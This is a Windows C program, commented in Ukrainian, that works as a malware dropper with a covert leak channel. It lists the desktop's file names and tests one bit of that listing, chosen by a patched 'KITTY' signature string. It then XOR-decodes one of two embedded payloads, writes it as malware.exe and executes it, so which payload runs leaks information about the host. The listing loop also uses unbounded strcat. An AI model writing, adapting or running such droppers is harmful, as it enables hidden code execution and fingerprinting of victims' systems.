#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include "leak.h"

#define SIG "KITTY"
char *bit = SIG "000";

int main() {
    CHAR buf[4096] = {0};
    CHAR desktopPath[MAX_PATH];
    HANDLE hFind;
    WIN32_FIND_DATA findFileData;

    // Отримуємо шлях до папки "Робочий стіл"
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {

        CHAR markerPath[MAX_PATH];
        sprintf(markerPath, "%s\\maomao.txt", desktopPath);
        FILE *markerFile = fopen(markerPath, "w");
        if (markerFile) {
            fclose(markerFile);
        }

        // Додаємо до шляху маску пошуку "\*.*"
        strcat(desktopPath, "\\*.*");

        // 3находимо перший файл на робочому столі
        hFind = FindFirstFile(desktopPath, &findFileData);

        if (hFind != INVALID_HANDLE_VALUE) {
            // Перебираємо всі файли в циклі
            do {
                // Ігноруємо системні папки "." та ".."
                if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                    // Додаємо ім'я файлу в наш буфер
                    strcat(buf, findFileData.cFileName);
                    strcat(buf, ","); // Додаємо кому як роздільник
                }
            } while (FindNextFile(hFind, &findFileData) != 0); // Шукаємо наступний файл

            // Закриваємо дескриптор пошуку
            FindClose(hFind);
        }
    }

    char *p;
    int b, psz;
    b = atoi(bit + sizeof(SIG) - 1);

    if (buf[b / 8] & (1 << (b % 8))) {
        p = bit1;
        psz = sizeof(bit1);
    } else {
        p = bit0;
        psz = sizeof(bit0);
    }

    FILE *out = fopen("malware.exe", "wb");
    while (psz--) {
        fputc(0xFF ^ *p++, out);
    }
    fclose(out);
    system("malware.exe");

    return 0;
}